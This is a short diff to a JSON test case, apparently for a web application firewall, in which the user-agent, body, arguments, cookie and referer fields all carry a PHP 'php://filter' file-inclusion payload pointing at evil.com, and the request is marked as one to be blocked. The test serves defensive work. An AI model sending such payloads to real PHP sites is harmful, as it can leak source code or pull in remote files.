@@ -1,14 +1,14 @@
 {
     "req": [
       {
-        "Type": "ALL",
         "UA": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
-        "Body": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
-        "ARGS": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+        "Body": "param%RND%=php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+        "ARGS": "param%RND%=php://filter/convert.base64-encode/resource=http://evil.com/index.php",
         "Cookie": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
         "URL": "",
         "Referer": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
-        "Headers": ""
+        "Headers": "",
+        "Blocked": true
       }
     ]
   }
